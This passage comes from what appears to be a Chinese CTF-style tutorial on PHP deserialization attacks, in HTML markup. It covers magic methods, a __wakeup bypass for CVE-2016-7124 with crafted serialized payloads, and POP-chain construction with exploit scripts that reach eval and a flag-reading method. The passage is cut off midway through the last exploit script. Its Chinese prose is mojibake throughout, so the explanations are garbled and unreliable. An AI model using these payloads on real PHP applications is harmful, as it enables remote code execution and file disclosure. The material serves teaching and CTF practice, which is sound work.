class="variable">$temp</span> = serialize(<span class="variable">$me</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$temp</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = unserialize(<span class="variable">$temp</span>);</span><br><span class="line"><span class="comment">//__wakeup()ç»„è£…çš„$info</span></span><br><span class="line"><span class="variable">$me</span>-&gt;getInfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    out:</span><br><span class="line">ID: twosmi1e, age: <span class="number">20</span>, sex: male</span><br><span class="line">Caiji::__sleep</span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Caiji&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;ID&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;twosmi1e&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;i:<span class="number">20</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;male&quot;</span>;&#125;</span><br><span class="line">Caiji::__wakeup</span><br><span class="line">ID: twosmi1e, age: <span class="number">20</span>, sex: male</span><br></pre></td></tr></table></figure><p>æµç¨‹ï¼š<code>__construct</code>-&gt;<code>getInfo()</code>-&gt;<code>__sleep</code>-&gt;<code>__wakeup</code>-&gt;<code>getInfo()</code></p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><blockquote><p>  __toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</p></blockquote><p>testï¼›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ID</span>, <span class="variable">$sex</span>, <span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ID = <span class="variable">$ID</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">&quot;ID: %s, age: %d, sex: %s&quot;</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = <span class="keyword">new</span> Caiji(<span class="string">&#x27;twosmi1e&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;__toString:&#x27;</span> . <span class="variable">$me</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    output:</span><br><span class="line">__toString:ID: twosmi1e, age: <span class="number">20</span>, sex: male</span><br></pre></td></tr></table></figure><h2 id="2-ååºåˆ—åŒ–å¯¹è±¡æ³¨å…¥"><a href="#2-ååºåˆ—åŒ–å¯¹è±¡æ³¨å…¥" class="headerlink" title="2.ååºåˆ—åŒ–å¯¹è±¡æ³¨å…¥"></a>2.ååºåˆ—åŒ–å¯¹è±¡æ³¨å…¥</h2><h3 id="1-ç»•è¿‡-wakeup-æ–¹æ³•"><a href="#1-ç»•è¿‡-wakeup-æ–¹æ³•" class="headerlink" title="1.ç»•è¿‡__wakeup()æ–¹æ³•"></a>1.ç»•è¿‡__wakeup()æ–¹æ³•</h3><p>test:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">&quot;\\&quot;</span>)===<span class="literal">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">&#x27;/&#x27;</span>)===<span class="literal">false</span>)</span><br><span class="line">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Wrong filename.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt; file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">return</span> &#x27;&#x27; </span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;     </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">  show_source(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">  <span class="variable">$file</span>=base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">  <span class="keyword">echo</span> unserialize(<span class="variable">$file</span>); </span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span> <span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure><p>å°±æ˜¯è¦åˆ©ç”¨unserializeå°†fileè®¾ä¸ºflag.phpï¼Œä½†æ˜¯<code>__wakeup</code>ä¼šåœ¨unserializeä¹‹å‰æ‰§è¡Œï¼Œæ‰€ä»¥è¦ç»•è¿‡è¿™ä¸€ç‚¹ã€‚</p><p>CVE-2016-7124æ¼æ´ï¼Œ<strong>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</strong></p><p>æ„é€ åºåˆ—åŒ–å¯¹è±¡ï¼š<code>O:5:&quot;SoFun&quot;:1:&#123;S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;</code><br><strong>ç»•è¿‡__wakeup</strong>ï¼š<code>O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><h2 id="3-POPé“¾æ„é€ "><a href="#3-POPé“¾æ„é€ " class="headerlink" title="3.POPé“¾æ„é€ "></a>3.POPé“¾æ„é€ </h2><h3 id="1-POPï¼šé¢å‘å±æ€§ç¼–ç¨‹"><a href="#1-POPï¼šé¢å‘å±æ€§ç¼–ç¨‹" class="headerlink" title="1.POPï¼šé¢å‘å±æ€§ç¼–ç¨‹"></a>1.POPï¼šé¢å‘å±æ€§ç¼–ç¨‹</h3><p>é¢å‘å±æ€§ç¼–ç¨‹ï¼ˆProperty-Oriented Programingï¼‰ ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾ã€‚åœ¨æ§åˆ¶ä»£ç æˆ–è€…ç¨‹åºçš„æ‰§è¡Œæµç¨‹åå°±èƒ½å¤Ÿä½¿ç”¨è¿™ä¸€ç»„è°ƒç”¨é“¾æ¥æ‰§è¡Œä¸€äº›æ“ä½œã€‚</p><h3 id="2-åŸºæœ¬æ¦‚å¿µ"><a href="#2-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="2.åŸºæœ¬æ¦‚å¿µ"></a>2.åŸºæœ¬æ¦‚å¿µ</h3><p>åœ¨äºŒè¿›åˆ¶åˆ©ç”¨æ—¶ï¼ŒROP é“¾æ„é€ ä¸­æ˜¯å¯»æ‰¾å½“å‰ç³»ç»Ÿç¯å¢ƒä¸­æˆ–è€…å†…å­˜ç¯å¢ƒé‡Œå·²ç»å­˜åœ¨çš„ã€å…·æœ‰å›ºå®šåœ°å€ä¸”å¸¦æœ‰è¿”å›æ“ä½œçš„æŒ‡ä»¤é›†ï¼Œè€Œ POP é“¾çš„æ„é€ åˆ™æ˜¯å¯»æ‰¾ç¨‹åºå½“å‰ç¯å¢ƒä¸­å·²ç»å®šä¹‰äº†æˆ–è€…èƒ½å¤ŸåŠ¨æ€åŠ è½½çš„å¯¹è±¡ä¸­çš„å±æ€§ï¼ˆå‡½æ•°æ–¹æ³•ï¼‰ï¼Œå°†ä¸€äº›å¯èƒ½çš„è°ƒç”¨ç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´çš„ã€å…·æœ‰ç›®çš„æ€§çš„æ“ä½œã€‚<br>äºŒè¿›åˆ¶ä¸­é€šå¸¸æ˜¯ç”±äºå†…å­˜æº¢å‡ºæ§åˆ¶äº†æŒ‡ä»¤æ‰§è¡Œæµç¨‹ï¼Œè€Œååºåˆ—åŒ–è¿‡ç¨‹å°±æ˜¯æ§åˆ¶ä»£ç æ‰§è¡Œæµç¨‹çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå‰æï¼š<strong>è¿›è¡Œååºåˆ—åŒ–çš„æ•°æ®èƒ½å¤Ÿè¢«ç”¨æˆ·è¾“å…¥æ‰€æ§åˆ¶ã€‚</strong></p><h3 id="3-POPé“¾åˆ©ç”¨"><a href="#3-POPé“¾åˆ©ç”¨" class="headerlink" title="3.POPé“¾åˆ©ç”¨"></a>3.POPé“¾åˆ©ç”¨</h3><p>ä¸€èˆ¬çš„åºåˆ—åŒ–æ”»å‡»éƒ½åœ¨PHPé­”æœ¯æ–¹æ³•ä¸­å‡ºç°å¯åˆ©ç”¨çš„æ¼æ´ï¼Œå› ä¸ºè‡ªåŠ¨è°ƒç”¨è§¦å‘æ¼æ´ï¼Œä½†å¦‚æœå…³é”®ä»£ç æ²¡åœ¨é­”æœ¯æ–¹æ³•ä¸­ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ä¸­ã€‚è¿™æ—¶å€™å°±å¯ä»¥é€šè¿‡æ„é€ POPé“¾å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°çš„å±æ€§è”ç³»èµ·æ¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>lemonç±»è°ƒç”¨normalç±»ï¼Œä¸”normalå’Œevilç±»éƒ½æœ‰actionæ–¹æ³•ï¼Œå¯ä»¥æ„é€ popé“¾è°ƒç”¨evilä¸­çš„actionæ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> lemon()));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ˜¯è¦å€ŸåŠ©<code>__construct</code>æ–¹æ³•ï¼Œä¸èƒ½ä½¿ç”¨<code>protected $ClassObj = new evil();</code></p><p>demo2:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">                <span class="variable">$s1</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;å­—ç¬¦ä¸²æ‹¼æ¥&quot;</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li> <code>string1</code>ä¸­çš„<code>__tostring</code>å­˜åœ¨<code>$this-&gt;str1-&gt;get_flag()</code>ï¼Œåˆ†æä¸€ä¸‹è¦è‡ªåŠ¨è°ƒç”¨<code>__tostring()</code>éœ€è¦æŠŠç±»<code>string1</code>å½“æˆå­—ç¬¦ä¸²æ¥ä½¿ç”¨ï¼Œå› ä¸ºè°ƒç”¨çš„æ˜¯å‚æ•°<code>str1</code>çš„æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦æŠŠ<code>str1</code>èµ‹å€¼ä¸ºç±»<code>GetFlag</code>çš„å¯¹è±¡ã€‚</li><li> å‘ç°ç±»<code>func</code>ä¸­å­˜åœ¨<code>__invoke</code>æ–¹æ³•æ‰§è¡Œäº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œéœ€è¦æŠŠ<code>func</code>å½“æˆå‡½æ•°ä½¿ç”¨è‡ªåŠ¨è°ƒç”¨<code>__invoke</code>ç„¶åæŠŠ<code>$mod1</code>èµ‹å€¼ä¸º<code>string1</code>çš„å¯¹è±¡ä¸<code>$mod2</code>æ‹¼æ¥ã€‚</li><li> åœ¨<code>funct</code>ä¸­æ‰¾åˆ°äº†å‡½æ•°è°ƒç”¨ï¼Œéœ€è¦æŠŠ<code>mod1</code>èµ‹å€¼ä¸º<code>func</code>ç±»çš„å¯¹è±¡ï¼Œåˆå› ä¸ºå‡½æ•°è°ƒç”¨åœ¨<code>__call</code>æ–¹æ³•ä¸­ï¼Œä¸”å‚æ•°ä¸º<code>$test2</code>,å³æ— æ³•è°ƒç”¨<code>test2</code>æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨ <code>__call</code>æ–¹æ³•ï¼›</li><li> åœ¨<code>Call</code>ä¸­çš„<code>test1</code>æ–¹æ³•ä¸­å­˜åœ¨<code>$this-&gt;mod1-&gt;test2();</code>ï¼Œéœ€è¦æŠŠ<code>$mod1</code>èµ‹å€¼ä¸º<code>funct</code>çš„å¯¹è±¡ï¼Œè®©<code>__call</code>è‡ªåŠ¨è°ƒç”¨ã€‚</li><li> æŸ¥æ‰¾<code>test1</code>æ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼Œåœ¨<code>start_gg</code>ä¸­å‘ç°<code>$this-&gt;mod1-&gt;test1();</code>ï¼ŒæŠŠ<code>$mod1</code>èµ‹å€¼ä¸º<code>start_gg</code>ç±»çš„å¯¹è±¡ï¼Œç­‰å¾…<code>__destruct()</code>è‡ªåŠ¨è°ƒç”¨ã€‚</li></ol><p>expï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();<span class="comment">//æŠŠ$mod1èµ‹å€¼ä¸ºCallç±»å¯¹è±¡</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();<span class="comment">//æŠŠ $mod1èµ‹å€¼ä¸ºfunctç±»å¯¹è±¡</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span 